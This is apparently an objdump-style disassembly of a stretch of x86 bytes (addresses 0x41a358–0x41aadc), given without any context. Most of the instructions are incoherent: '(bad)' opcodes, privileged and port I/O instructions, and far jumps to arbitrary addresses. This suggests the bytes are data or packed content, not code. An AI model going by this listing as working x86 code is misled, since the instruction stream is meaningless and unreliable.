  41a358:	xor    DWORD PTR [ebp-0x5276fa86],eax
  41a35e:	ins    DWORD PTR es:[edi],dx
  41a35f:	rcl    BYTE PTR [esi],0x6d
  41a362:	ret    
  41a363:	test   DWORD PTR [ecx+0x7a],ecx
  41a366:	dec    esp
  41a367:	out    0x37,eax
  41a369:	lahf   
  41a36a:	mov    esi,DWORD PTR [edx+ecx*2+0x1c3fec80]
  41a371:	and    DWORD PTR [edi+0x48],ebp
  41a374:	adc    DWORD PTR [ecx],esi
  41a376:	xchg   edx,eax
  41a377:	retf   
  41a378:	iret   
  41a379:	retf   
  41a37a:	xchg   ecx,eax
  41a37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a37c:	push   cs
  41a37d:	and    esp,edx
  41a37f:	cli    
  41a380:	and    al,0x84
  41a382:	ss out dx,eax
  41a384:	push   cs
  41a385:	call   0xe138bb0c
  41a38a:	xlat   BYTE PTR ds:[ebx]
  41a38b:	xchg   esi,eax
  41a38c:	lea    ebp,[esi]
  41a38e:	push   ebx
  41a38f:	(bad)  
  41a390:	push   ss
  41a391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a392:	add    al,0xce
  41a394:	xor    al,0x0
  41a396:	xlat   BYTE PTR ds:[ebx]
  41a397:	cmp    al,0x9d
  41a399:	into   
  41a39a:	jb     0x41a40f
  41a39c:	ret    
  41a39d:	bound  esi,QWORD PTR ds:0xa1ba940d
  41a3a3:	push   cs
  41a3a4:	in     eax,0x6f
  41a3a6:	fwait
  41a3a7:	cld    
  41a3a8:	sbb    DWORD PTR [ebx+edx*2],ebx
  41a3ab:	push   ss
  41a3ac:	pop    ecx
  41a3ad:	xchg   edx,eax
  41a3ae:	in     eax,dx
  41a3af:	mov    dl,0x80
  41a3b1:	and    cl,BYTE PTR [edx]
  41a3b3:	pop    esp
  41a3b4:	(bad)  
  41a3b5:	bound  edx,QWORD PTR ds:0x3abb17c7
  41a3bb:	fs xchg ebx,eax
  41a3bd:	jns    0x41a427
  41a3bf:	rcl    BYTE PTR [esp+edx*8+0x42ffeaf8],0xfe
  41a3c7:	leave  
  41a3c8:	jbe    0x41a3d1
  41a3ca:	test   BYTE PTR [esi],dl
  41a3cc:	stos   DWORD PTR es:[edi],eax
  41a3cd:	arpl   WORD PTR [esi-0x32],si
  41a3d0:	test   BYTE PTR [edi+0x7a],cl
  41a3d3:	cmp    dh,0x9b
  41a3d6:	and    bl,BYTE PTR [ebp-0x4]
  41a3d9:	neg    DWORD PTR [ebx+0x262cc232]
  41a3df:	or     bh,BYTE PTR [ebx+0x69]
  41a3e2:	ja     0x41a3f9
  41a3e4:	mov    ds:0x344d7a08,al
  41a3e9:	jl     0x41a448
  41a3eb:	mov    edx,0xdb148f73
  41a3f0:	fsubr  QWORD PTR [ebp-0x67]
  41a3f3:	outs   dx,BYTE PTR ds:[esi]
  41a3f4:	adc    BYTE PTR gs:[esi+ecx*1-0x404d98fe],bh
  41a3fc:	inc    ecx
  41a3fd:	popa   
  41a3fe:	inc    ecx
  41a3ff:	test   eax,ecx
  41a401:	add    BYTE PTR [eax-0x2f],dl
  41a404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a405:	lods   eax,DWORD PTR ds:[esi]
  41a406:	push   esp
  41a407:	pop    ebp
  41a408:	ret    0xa176
  41a40b:	xlat   BYTE PTR ds:[ebx]
  41a40c:	mov    ds:0x7f2bf4bb,al
  41a411:	test   al,0xed
  41a413:	mov    WORD PTR [eax-0x44],fs
  41a416:	daa    
  41a417:	cmp    al,0x71
  41a419:	jge    0x41a448
  41a41b:	jge    0x41a44e
  41a41d:	(bad)  
  41a41e:	loop   0x41a47f
  41a420:	xchg   esp,eax
  41a421:	sbb    al,0xf1
  41a423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a424:	shl    esi,0x4b
  41a427:	inc    eax
  41a428:	adc    al,0x1f
  41a42a:	call   0x2c04189a
  41a42f:	lock jns 0x41a47b
  41a432:	lahf   
  41a433:	mov    ah,0xa0
  41a435:	mov    esi,0xfc4bcc62
  41a43a:	cmp    ecx,DWORD PTR [edi+0x28]
  41a43d:	(bad)  
  41a440:	sub    DWORD PTR [ebp-0x6c],edi
  41a443:	fs stos DWORD PTR es:[edi],eax
  41a445:	out    dx,al
  41a446:	call   0xb26f3880
  41a44b:	clc    
  41a44c:	inc    edi
  41a44d:	adc    al,0x76
  41a44f:	xchg   ebp,eax
  41a450:	mov    esi,0xd8e2f891
  41a455:	mov    ds:0xf3706f2e,eax
  41a45a:	loope  0x41a4c0
  41a45c:	sub    al,0xa6
  41a45e:	xchg   esi,eax
  41a45f:	(bad)  
  41a460:	cli    
  41a461:	cwde   
  41a462:	imul   ecx,DWORD PTR [ebx+eax*1-0x2f],0xffffff94
  41a467:	lea    eax,[esi+0x76bfe0d1]
  41a46d:	or     DWORD PTR [esi],ebx
  41a46f:	inc    eax
  41a470:	add    al,0x43
  41a472:	mov    edi,0x12b642db
  41a477:	dec    ecx
  41a478:	pop    ebp
  41a479:	fs js  0x41a499
  41a47c:	xor    cl,BYTE PTR [ecx+0x32]
  41a47f:	adc    al,0x1b
  41a481:	rol    BYTE PTR [ebx-0x3a],1
  41a484:	das    
  41a485:	mov    dl,0x83
  41a487:	mov    bh,0x5d
  41a489:	adc    al,0xf6
  41a48b:	add    al,0x38
  41a48d:	lock ds jmp 0xc7db7b42
  41a494:	inc    eax
  41a495:	mov    cl,0x55
  41a497:	xor    eax,0x91220fb5
  41a49c:	fisubr DWORD PTR [ecx]
  41a49e:	xchg   edx,eax
  41a49f:	ds test ebp,esi
  41a4a2:	and    al,0x3a
  41a4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a5:	dec    edi
  41a4a6:	pushf  
  41a4a7:	idiv   DWORD PTR [eax+0x36]
  41a4aa:	and    eax,0x39b89841
  41a4af:	arpl   WORD PTR [eax-0x61],dx
  41a4b2:	rcr    ch,cl
  41a4b4:	cmp    al,0xda
  41a4b6:	popf   
  41a4b7:	cmc    
  41a4b8:	sub    ch,BYTE PTR [eax+0x5b4dd6c4]
  41a4be:	pop    esi
  41a4bf:	jmp    0xd4d7:0x38f1ea9a
  41a4c6:	cdq    
  41a4c7:	pop    ss
  41a4c8:	jmp    0x41a4df
  41a4ca:	aam    0x1c
  41a4cc:	aad    0x8b
  41a4ce:	into   
  41a4cf:	or     al,al
  41a4d1:	retf   
  41a4d2:	adc    DWORD PTR [esi+0x98019cf],edi
  41a4d8:	lahf   
  41a4d9:	sbb    eax,0xeeacc453
  41a4de:	mov    eax,ds:0x562af8bf
  41a4e3:	jne    0x41a469
  41a4e5:	fsub   QWORD PTR [edx+0x7bdbde44]
  41a4eb:	ja     0x41a470
  41a4ed:	sub    esp,DWORD PTR ds:0x91e1c8ef
  41a4f3:	jb     0x41a4b4
  41a4f5:	out    0x68,eax
  41a4f7:	and    eax,0xd6dc2c1d
  41a4fc:	mov    BYTE PTR [esp+edi*8+0x15],ah
  41a500:	mov    ah,0xa0
  41a502:	xor    eax,0x3d88ea15
  41a507:	les    ebx,FWORD PTR [ecx+0x2c]
  41a50a:	ret    
  41a50b:	lea    edi,ds:0x45e4291a
  41a511:	ss (bad) 
  41a513:	jae    0x41a566
  41a515:	fwait
  41a516:	push   ebx
  41a517:	sub    al,0xbe
  41a519:	and    esi,DWORD PTR [esi-0x7a]
  41a51c:	je     0x41a4aa
  41a51e:	push   0xffffffde
  41a520:	inc    ebp
  41a521:	pop    esp
  41a522:	and    bl,ch
  41a524:	addr16 sbb ebx,edi
  41a527:	lods   al,BYTE PTR ds:[esi]
  41a528:	adc    edi,DWORD PTR [ebx-0x45]
  41a52b:	cli    
  41a52c:	shl    ebx,0x1c
  41a52f:	cs daa 
  41a531:	xchg   ebx,eax
  41a532:	dec    edx
  41a533:	mov    al,0xcf
  41a535:	pop    ds
  41a536:	ret    0x2144
  41a539:	jnp    0x41a4d6
  41a53b:	fsubr  DWORD PTR [ecx-0x16]
  41a53e:	xchg   ebx,eax
  41a53f:	adc    al,0x61
  41a541:	cli    
  41a542:	aam    0xb7
  41a544:	jnp    0x41a581
  41a546:	enter  0xfabc,0x36
  41a54a:	arpl   WORD PTR [edi],di
  41a54c:	add    eax,0x77922809
  41a551:	xor    eax,DWORD PTR [eax-0x697a9aa9]
  41a557:	adc    BYTE PTR ds:0xf5a72710,cl
  41a55d:	rol    dh,0x23
  41a560:	enter  0x4c6,0xaa
  41a564:	jmp    0xe603:0xa8c3ee70
  41a56b:	cli    
  41a56c:	ficomp DWORD PTR ds:0xfc04238c
  41a572:	push   ecx
  41a573:	aad    0xe6
  41a575:	add    edi,DWORD PTR [esi+0x6156d101]
  41a57b:	xlat   BYTE PTR ds:[ebx]
  41a57c:	sahf   
  41a57d:	gs xor al,0x4e
  41a580:	mov    ds:0x82e82670,al
  41a585:	jno    0x41a5e7
  41a587:	fmul   QWORD PTR [ecx+0x10]
  41a58a:	jb     0x41a564
  41a58c:	lds    esi,FWORD PTR [eax]
  41a58e:	jmp    0x41a53e
  41a590:	inc    ebp
  41a591:	add    BYTE PTR ds:0xc1874e4,ah
  41a597:	or     DWORD PTR [esi+ecx*1+0x41],0xc8d8913a
  41a59f:	in     al,0x2
  41a5a1:	aam    0xc2
  41a5a3:	xchg   ebx,eax
  41a5a4:	cli    
  41a5a5:	mov    edx,0x819f17df
  41a5aa:	and    bh,bl
  41a5ac:	sub    eax,0x28c0c51
  41a5b1:	mov    bl,dh
  41a5b3:	jb     0x41a5a1
  41a5b5:	ss mov dl,0xa6
  41a5b8:	pop    eax
  41a5b9:	mov    ds:0xd9a81d7b,al
  41a5be:	sub    al,0xb8
  41a5c0:	pusha  
  41a5c1:	hlt    
  41a5c2:	inc    eax
  41a5c3:	test   BYTE PTR [edi],0xda
  41a5c6:	sahf   
  41a5c7:	sub    bh,BYTE PTR [eax+0x7a3e0573]
  41a5cd:	out    dx,eax
  41a5ce:	mov    edx,0x225d5907
  41a5d3:	pop    ss
  41a5d4:	repz push es
  41a5d6:	dec    esi
  41a5d7:	push   esi
  41a5d8:	les    edi,FWORD PTR [eax+eiz*8+0x4e033762]
  41a5df:	adc    al,0xbc
  41a5e1:	cmc    
  41a5e2:	popf   
  41a5e3:	jo     0x41a576
  41a5e5:	imul   edx,ebx,0x5f
  41a5e8:	jmp    0x41a5bb
  41a5ea:	imul   DWORD PTR [eax+0xe]
  41a5ed:	fbstp  TBYTE PTR [esi]
  41a5ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f0:	add    DWORD PTR [ebx+0xa],eax
  41a5f3:	in     al,0x90
  41a5f5:	inc    ebp
  41a5f6:	jb     0x41a5b4
  41a5f8:	(bad)  
  41a5f9:	sub    eax,0x8866fb54
  41a5fe:	imul   edi,DWORD PTR [edi+eiz*8-0x3d0ba5a7],0xb86b4e04
  41a609:	data16 (bad) 
  41a60b:	jmp    0x5713:0xe536ad0d
  41a612:	jmp    0x41a5ec
  41a614:	hlt    
  41a615:	mov    ?,WORD PTR [edi+0x1cddfecc]
  41a61b:	shl    edx,0xf9
  41a61e:	inc    ecx
  41a61f:	test   ah,0x36
  41a622:	jecxz  0x41a64c
  41a624:	fwait
  41a625:	in     eax,0x4d
  41a627:	xor    al,ah
  41a629:	ror    ebx,0x1e
  41a62c:	sub    DWORD PTR [eax-0x48],0x62689aa6
  41a633:	loope  0x41a662
  41a635:	stc    
  41a636:	(bad)  
  41a637:	jb     0x41a656
  41a639:	mov    ?,WORD PTR [edi]
  41a63b:	sub    DWORD PTR ds:0xbe7ada6b,edi
  41a641:	clc    
  41a642:	sar    BYTE PTR [ebp+eiz*4-0x7361ac03],cl
  41a649:	bound  eax,QWORD PTR [eax+eiz*2+0x47b42380]
  41a650:	cmp    eax,0x28411197
  41a655:	pop    ecx
  41a656:	sahf   
  41a657:	jp     0x41a6d8
  41a659:	cwde   
  41a65a:	or     esi,DWORD PTR [ebp+0x6d]
  41a65d:	lock repz ret 0xff65
  41a662:	pop    ebp
  41a663:	mov    edi,0x647b77df
  41a668:	aaa    
  41a669:	ins    DWORD PTR es:[edi],dx
  41a66a:	retf   
  41a66b:	inc    esp
  41a66c:	mov    al,ds:0x78dd90b7
  41a671:	jnp    0x41a6cb
  41a673:	repnz xor BYTE PTR [eax-0x2b9a80b4],ch
  41a67a:	nop
  41a67b:	lahf   
  41a67c:	dec    edi
  41a67d:	bound  edi,QWORD PTR [eax-0xe194bb8]
  41a683:	retf   
  41a684:	inc    eax
  41a685:	sub    eax,0xa8ec297f
  41a68a:	in     eax,dx
  41a68b:	sbb    ch,BYTE PTR [ebx+0x31]
  41a68e:	stos   BYTE PTR es:[edi],al
  41a68f:	mov    ds:0xec296c3f,eax
  41a694:	loope  0x41a6bf
  41a696:	ins    DWORD PTR es:[edi],dx
  41a697:	sbb    eax,0x933b069b
  41a69c:	repz in al,0xe2
  41a69f:	mov    ds:0x7931f9b3,eax
  41a6a4:	in     eax,dx
  41a6a5:	or     edx,DWORD PTR [edi-0x191cda42]
  41a6ab:	cmc    
  41a6ac:	inc    eax
  41a6ad:	ss call 0xc7329f60
  41a6b3:	(bad)  fs:[edi-0x4e]
  41a6b7:	mov    dl,0x74
  41a6b9:	inc    edi
  41a6ba:	xor    ebx,edx
  41a6bc:	add    ah,BYTE PTR [edi+0x46]
  41a6bf:	repnz cmc 
  41a6c1:	(bad)  
  41a6c3:	and    DWORD PTR [esi-0x5080378e],ecx
  41a6c9:	outs   dx,BYTE PTR ds:[esi]
  41a6ca:	retf   
  41a6cb:	test   DWORD PTR [ebx-0x8],ecx
  41a6ce:	xor    edi,edx
  41a6d0:	cmp    BYTE PTR ds:0x54b8ed8,ah
  41a6d6:	add    al,0x14
  41a6d8:	std    
  41a6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6da:	mov    eax,ds:0x2e040b54
  41a6df:	mov    edx,0x96729ee8
  41a6e4:	test   DWORD PTR [ebp+0x24ac8050],esp
  41a6ea:	push   ss
  41a6eb:	(bad)
  41a6ee:	dec    esi
  41a6ef:	and    al,0x79
  41a6f1:	hlt    
  41a6f2:	ja     0x41a68c
  41a6f4:	mov    ebp,0x431013fa
  41a6f9:	lods   al,BYTE PTR ds:[esi]
  41a6fa:	call   0x4381b0c0
  41a6ff:	cmp    DWORD PTR [esi],ebp
  41a701:	jnp    0x41a6b4
  41a703:	call   0x8308:0x423562e
  41a70a:	fistp  QWORD PTR [edx]
  41a70c:	jmp    0x9475:0xcde76a28
  41a713:	inc    eax
  41a714:	ror    ah,0x3b
  41a717:	push   eax
  41a718:	add    al,0x3
  41a71a:	lahf   
  41a71b:	inc    ecx
  41a71d:	push   ebx
  41a71e:	ret    0x45d5
  41a721:	sub    ecx,0x71
  41a724:	xchg   esi,eax
  41a725:	jne    0x41a79c
  41a727:	adc    dl,BYTE PTR cs:[eax-0x5000fc9e]
  41a72e:	and    BYTE PTR [edx-0x4a],ah
  41a731:	(bad)  
  41a732:	mov    cl,0xb2
  41a734:	jmp    0x8d22af28
  41a739:	out    dx,eax
  41a73a:	jae    0x41a77c
  41a73c:	ds jno 0x41a771
  41a73f:	sar    BYTE PTR [eax-0x605a93c3],1
  41a745:	mov    cl,0x10
  41a747:	mov    bh,bh
  41a749:	cmpxchg8b QWORD PTR [eax-0x69fc580f]
  41a750:	push   ecx
  41a751:	mov    esp,0x67dcd092
  41a756:	xor    eax,0xeb7619
  41a75b:	retf   0xd70e
  41a75e:	out    dx,eax
  41a75f:	pop    ebx
  41a760:	(bad)  
  41a761:	cmp    eax,0xe92d32d5
  41a766:	xor    BYTE PTR [edi-0x1f],al
  41a769:	mov    bh,0x91
  41a76b:	nop
  41a76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a76d:	cmp    ah,0x61
  41a770:	jmp    0x41a709
  41a772:	das    
  41a773:	clts   
  41a775:	mov    BYTE PTR [edx+0x1c],cl
  41a778:	cmp    BYTE PTR [ecx-0x79],dl
  41a77b:	stos   BYTE PTR es:[edi],al
  41a77c:	popa   
  41a77d:	jbe    0x41a79d
  41a77f:	mov    ebx,ebp
  41a781:	fistp  QWORD PTR [edi]
  41a783:	outs   dx,BYTE PTR ds:[esi]
  41a784:	lods   al,BYTE PTR ds:[esi]
  41a785:	das    
  41a786:	xchg   ecx,eax
  41a787:	jbe    0x41a7e3
  41a789:	imul   eax,ebx,0x3a
  41a78c:	repz and BYTE PTR [ecx+0x53],0x5b
  41a791:	mov    dl,0x22
  41a793:	mov    edx,DWORD PTR [ecx]
  41a795:	sbb    eax,0x6b3fe8bc
  41a79a:	push   edx
  41a79b:	fidivr WORD PTR [esi-0x7cf12845]
  41a7a1:	push   0x6eca2fa9
  41a7a6:	dec    eax
  41a7a7:	ss int 0x30
  41a7aa:	in     eax,0xfc
  41a7ac:	das    
  41a7ad:	or     edx,DWORD PTR [ebx+0x5f5e1ec4]
  41a7b3:	aam    0xe9
  41a7b5:	jnp    0x41a7c1
  41a7b7:	or     al,0xb4
  41a7b9:	push   eax
  41a7ba:	push   ebp
  41a7bb:	sub    cl,BYTE PTR [eiz*4+0x4fa25d1b]
  41a7c2:	mov    al,ds:0x973bb17f
  41a7c7:	add    BYTE PTR [ebp-0x63],cl
  41a7ca:	and    bh,BYTE PTR [edi+eax*2]
  41a7cd:	(bad)  
  41a7ce:	call   0x6beb99c8
  41a7d3:	push   esi
  41a7d4:	mov    ebx,eax
  41a7d6:	ins    DWORD PTR es:[di],dx
  41a7d8:	lahf   
  41a7d9:	loope  0x41a78c
  41a7db:	popf   
  41a7dc:	jb     0x41a7f9
  41a7de:	sti    
  41a7df:	call   0x1d4a2705
  41a7e4:	je     0x41a7c5
  41a7e6:	sub    cl,BYTE PTR [ecx+0x698ac46f]
  41a7ec:	xor    esi,esi
  41a7ee:	add    DWORD PTR [edi+0x18753f34],eax
  41a7f4:	jmp    0xeefe8684
  41a7f9:	jmp    0x53654bba
  41a7fe:	push   esp
  41a7ff:	xor    BYTE PTR [ebp+0x1e],dl
  41a802:	ud1    ecx,ebx
  41a805:	push   ds
  41a806:	sti    
  41a807:	inc    ecx
  41a808:	push   ebx
  41a809:	outs   dx,DWORD PTR ds:[esi]
  41a80a:	inc    esi
  41a80b:	ins    DWORD PTR es:[edi],dx
  41a80c:	dec    esi
  41a80d:	mov    bh,0xad
  41a80f:	or     esi,ebp
  41a811:	pop    es
  41a812:	or     dh,dh
  41a814:	divps  xmm4,XMMWORD PTR [esi-0x3238489f]
  41a81b:	daa    
  41a81c:	dec    edx
  41a81d:	jecxz  0x41a839
  41a81f:	stos   BYTE PTR es:[edi],al
  41a820:	cwde   
  41a821:	and    eax,0xe563143e
  41a826:	int    0xeb
  41a828:	fnstsw WORD PTR [eax-0x2d0422ad]
  41a82e:	mov    ?,WORD PTR [ebx-0x211fa63]
  41a834:	pushf  
  41a835:	loope  0x41a85a
  41a837:	mov    cl,0x1e
  41a839:	ss sbb al,0xbb
  41a83c:	jp     0x41a88d
  41a83e:	jmp    0x8d51:0xce8c9b0c
  41a845:	inc    esp
  41a846:	sbb    DWORD PTR [eax],0xffffffd3
  41a849:	enter  0xf1ed,0xa2
  41a84d:	retf   
  41a84e:	nop
  41a84f:	aam    0x96
  41a851:	stos   BYTE PTR es:[edi],al
  41a852:	shl    BYTE PTR [eax],cl
  41a854:	aas    
  41a855:	inc    edx
  41a856:	jg     0x41a896
  41a858:	das    
  41a859:	push   0x8e7332c7
  41a85e:	pop    edi
  41a85f:	push   ecx
  41a860:	shl    DWORD PTR es:[ebp+0x25],1
  41a864:	sub    dl,BYTE PTR [ebx+0x244faa1]
  41a86a:	push   eax
  41a86b:	push   ss
  41a86c:	iret   
  41a86d:	and    ebp,esi
  41a86f:	sar    WORD PTR [ebx],1
  41a872:	pushf  
  41a873:	and    esi,DWORD PTR [eax+0x1f]
  41a876:	lahf   
  41a877:	sbb    esi,DWORD PTR [ebp-0x7c111ce6]
  41a87d:	stos   BYTE PTR es:[edi],al
  41a87e:	and    al,0x2c
  41a880:	les    edx,FWORD PTR [edi-0x56fe200]
  41a886:	test   al,0xee
  41a888:	mov    edx,0xed67a508
  41a88d:	pop    ebp
  41a88e:	div    cl
  41a890:	loopne 0x41a8cb
  41a892:	adc    eax,0xa4ced57
  41a897:	jecxz  0x41a840
  41a899:	push   ebx
  41a89a:	pop    ebp
  41a89b:	jno    0x41a89d
  41a89d:	push   edx
  41a89e:	ficomp DWORD PTR [eax+edx*4]
  41a8a1:	jbe    0x41a8e1
  41a8a3:	inc    edi
  41a8a4:	cmp    eax,0x96f32ad
  41a8a9:	je     0x41a87c
  41a8ab:	add    ch,0x72
  41a8ae:	add    esi,0x601a6889
  41a8b4:	push   edx
  41a8b5:	mov    dl,0xab
  41a8b7:	jmp    0x85e1:0x77f8c31b
  41a8be:	sti    
  41a8bf:	pop    ds
  41a8c0:	mov    ?,WORD PTR [eax]
  41a8c2:	xor    al,0x46
  41a8c4:	out    dx,al
  41a8c5:	inc    edx
  41a8c6:	lock test BYTE PTR [edx+0x5330eb96],bl
  41a8cd:	shl    BYTE PTR [eax+0x2d],1
  41a8d0:	inc    esi
  41a8d1:	retf   0xe14d
  41a8d4:	call   FWORD PTR [ecx-0x79bff2fc]
  41a8da:	(bad)  
  41a8dc:	arpl   WORD PTR [edi+edx*1],sp
  41a8df:	popa   
  41a8e0:	cmp    BYTE PTR [eax-0xd767811],ah
  41a8e6:	fnstsw WORD PTR [ebp-0x2b]
  41a8e9:	adc    BYTE PTR [ebp-0x70],0xa6
  41a8ed:	iret   
  41a8ee:	mov    ebp,0x27bf10
  41a8f3:	add    BYTE PTR [edi+0x37],0x15
  41a8f7:	push   cs
  41a8f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8f9:	retf   0x8ba3
  41a8fc:	pop    ebx
  41a8fd:	mov    dl,0xa9
  41a8ff:	clc    
  41a900:	cdq    
  41a901:	mov    eax,0xad21de13
  41a906:	in     al,dx
  41a907:	xchg   edx,eax
  41a908:	fsincos 
  41a90a:	pop    edi
  41a90b:	div    BYTE PTR [ecx]
  41a90d:	push   es
  41a90e:	pop    eax
  41a90f:	js     0x41a8b9
  41a911:	jno    0x41a8ef
  41a913:	mov    al,ds:0xa2568822
  41a918:	fidiv  WORD PTR [edi-0x20]
  41a91b:	dec    ebx
  41a91c:	int    0x8c
  41a91e:	sbb    dl,dh
  41a920:	cs loop 0x41a8a8
  41a923:	mov    ch,0xa1
  41a925:	shl    edi,cl
  41a927:	ror    dh,cl
  41a929:	les    ecx,FWORD PTR [eax]
  41a92b:	aam    0x97
  41a92d:	sbb    bh,BYTE PTR gs:[esi+0x4b4f8dd3]
  41a934:	add    DWORD PTR [edi],0xc1c26cb1
  41a93a:	std    
  41a93b:	jo     0x41a95c
  41a93d:	mov    bh,0x36
  41a93f:	iret   
  41a940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a941:	psubd  mm4,QWORD PTR [esi]
  41a944:	fiadd  WORD PTR [edx-0x14]
  41a947:	cmp    BYTE PTR [esi-0x77],dl
  41a94a:	jecxz  0x41a908
  41a94c:	jmp    0x47c6:0x9491c9ac
  41a953:	imul   ecx,DWORD PTR [eax+0x1dd92763],0xfffffff9
  41a95a:	add    DWORD PTR ds:0x56c95ae8,0xf22e6a6e
  41a964:	ins    DWORD PTR es:[edi],dx
  41a965:	mov    edi,0x2488ba8c
  41a96a:	sub    eax,0x340506b6
  41a96f:	pop    ebx
  41a970:	mov    esi,DWORD PTR [edi-0x7a]
  41a973:	add    DWORD PTR [ecx-0x40],edi
  41a976:	lods   al,BYTE PTR ds:[esi]
  41a977:	int3   
  41a978:	outs   dx,DWORD PTR ds:[esi]
  41a979:	mov    WORD PTR [edi],gs
  41a97b:	fld    st(1)
  41a97d:	xchg   ecx,eax
  41a97e:	jns    0x41a99b
  41a980:	js     0x41a936
  41a982:	add    ch,ah
  41a984:	xchg   DWORD PTR [ecx-0x4c],edi
  41a987:	jnp    0x41a978
  41a989:	arpl   WORD PTR [eax+ebx*2+0x68cd3399],ax
  41a990:	jmp    0x41a9fd
  41a992:	add    eax,0xbc886eb8
  41a997:	outs   dx,DWORD PTR ds:[esi]
  41a998:	xchg   ecx,edx
  41a99a:	or     eax,0x80b2a99a
  41a99f:	jb     0x41a95b
  41a9a1:	out    0x50,eax
  41a9a3:	mov    bh,0x37
  41a9a5:	push   ebp
  41a9a6:	push   eax
  41a9a7:	mov    edx,0x43ffb2a
  41a9ac:	mov    ecx,0xda9d1bce
  41a9b1:	popa   
  41a9b2:	and    al,0x39
  41a9b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b5:	sbb    ebx,DWORD PTR [ebx]
  41a9b7:	pop    edi
  41a9b8:	in     al,0x4b
  41a9ba:	outs   dx,DWORD PTR ds:[esi]
  41a9bb:	pop    ds
  41a9bc:	arpl   WORD PTR [eax+0x4e],ax
  41a9bf:	and    DWORD PTR [ecx-0x59bd9a6a],esi
  41a9c5:	dec    ebp
  41a9c6:	add    DWORD PTR [eax-0x3b],0x59
  41a9ca:	mov    edi,0xfa7270e
  41a9cf:	jbe    0x41a997
  41a9d1:	jbe    0x41a9c8
  41a9d3:	and    esi,DWORD PTR ds:0x4e02ab20
  41a9d9:	inc    ecx
  41a9da:	gs cli 
  41a9dc:	call   0xc3d42db6
  41a9e1:	xchg   bh,cl
  41a9e3:	and    bl,BYTE PTR [edx+0x66]
  41a9e6:	push   esp
  41a9e7:	and    DWORD PTR [edi],ebp
  41a9e9:	imul   edi,DWORD PTR [edi+0x4952b7bb],0x5a19218c
  41a9f3:	jmp    DWORD PTR [ebx-0x25]
  41a9f6:	mov    al,ah
  41a9f8:	jle    0x41aa22
  41a9fa:	aas    
  41a9fb:	push   ds
  41a9fc:	adc    eax,DWORD PTR [edi+0x2f781582]
  41aa02:	adc    eax,0x6d92a3b4
  41aa07:	mov    cs,edx
  41aa09:	push   cs
  41aa0a:	call   0xe4eea427
  41aa0f:	ds imul edx,esi,0xffffffb2
  41aa13:	inc    edx
  41aa14:	outs   dx,DWORD PTR ds:[esi]
  41aa15:	adc    edx,eax
  41aa17:	das    
  41aa18:	push   ecx
  41aa19:	mov    WORD PTR [esi],ss
  41aa1b:	push   0x7f
  41aa1d:	cmp    al,0x3f
  41aa1f:	push   ss
  41aa20:	or     DWORD PTR [ebx+0x2d],eax
  41aa23:	xchg   ecx,eax
  41aa24:	nop
  41aa25:	lds    ecx,FWORD PTR [edx+0x6]
  41aa28:	fstp   QWORD PTR [esi+0x78]
  41aa2b:	cmp    cl,BYTE PTR [esi+0x71]
  41aa2e:	add    DWORD PTR [eax+0x3b],esp
  41aa31:	xor    BYTE PTR [edx-0x19],dl
  41aa34:	inc    ecx
  41aa35:	mov    WORD PTR [edi-0xe],cs
  41aa38:	jp     0x41a9ea
  41aa3a:	pop    esi
  41aa3b:	ins    DWORD PTR es:[edi],dx
  41aa3c:	das    
  41aa3d:	fs dec ecx
  41aa3f:	int    0x91
  41aa41:	jbe    0x41aa68
  41aa43:	xchg   ebx,eax
  41aa44:	nop
  41aa45:	push   cs
  41aa46:	in     eax,dx
  41aa47:	xor    dl,0xe2
  41aa4a:	out    dx,eax
  41aa4b:	adc    al,BYTE PTR [ebp+0x36d707fe]
  41aa51:	dec    esi
  41aa52:	je     0x41a9dd
  41aa54:	pop    edi
  41aa55:	xchg   BYTE PTR [ebx+0x6e0e4bbe],bl
  41aa5b:	stc    
  41aa5c:	pop    esp
  41aa5d:	xor    al,BYTE PTR [edx]
  41aa5f:	inc    edi
  41aa60:	push   ecx
  41aa61:	and    eax,0xbab2edb3
  41aa66:	sub    al,0xfa
  41aa68:	mov    bl,0x94
  41aa6a:	dec    esp
  41aa6b:	add    al,0xc6
  41aa6d:	add    ebp,DWORD PTR [edx]
  41aa6f:	xchg   BYTE PTR [edi+0x27],dh
  41aa72:	pushf  
  41aa73:	or     DWORD PTR [ebx],0x4664de16
  41aa79:	jecxz  0x41aa73
  41aa7b:	push   ecx
  41aa7c:	push   es
  41aa7d:	sbb    eax,0xedde3e06
  41aa82:	pop    es
  41aa83:	jb     0x41aa0a
  41aa85:	cmp    eax,0xb81a47dd
  41aa8a:	fidivr WORD PTR [ebx-0x63]
  41aa8d:	clc    
  41aa8e:	xor    BYTE PTR [ecx],ah
  41aa90:	(bad)  
  41aa92:	adc    DWORD PTR [edi],eax
  41aa94:	or     DWORD PTR [ebx],esp
  41aa96:	or     al,0x28
  41aa98:	mov    eax,ds:0xa5dc3fe3
  41aa9d:	fnsave [eax+0x65]
  41aaa0:	push   esp
  41aaa1:	imul   edx,DWORD PTR [edi+0x3d],0x46
  41aaa5:	adc    ecx,ebp
  41aaa7:	jae    0x41aab3
  41aaa9:	out    dx,eax
  41aaaa:	fimul  DWORD PTR [edx+0x1d05a6c3]
  41aab0:	push   ds
  41aab1:	jg     0x41aad6
  41aab3:	mov    ds:0x9236d10a,eax
  41aab8:	jbe    0x41aaa6
  41aaba:	retf   
  41aabb:	daa    
  41aabc:	push   0xffffffd0
  41aabe:	inc    ecx
  41aabf:	push   edi
  41aac0:	pop    edi
  41aac1:	sub    eax,0xb5f5520b
  41aac6:	nop
  41aac7:	(bad)  
  41aac8:	outs   dx,DWORD PTR ds:[esi]
  41aac9:	adc    DWORD PTR [ebp+0x4b],edx
  41aacc:	xor    DWORD PTR [edi+0xf41a69a],0xffffffba
  41aad3:	ja     0x41ab0c
  41aad5:	pushfw 
  41aad7:	jnp    0x41aa85
  41aad9:	and    cl,BYTE PTR [edi+0x1]
  41aadc:	fsub   QWORD PTR ds:[ebp+0x37]
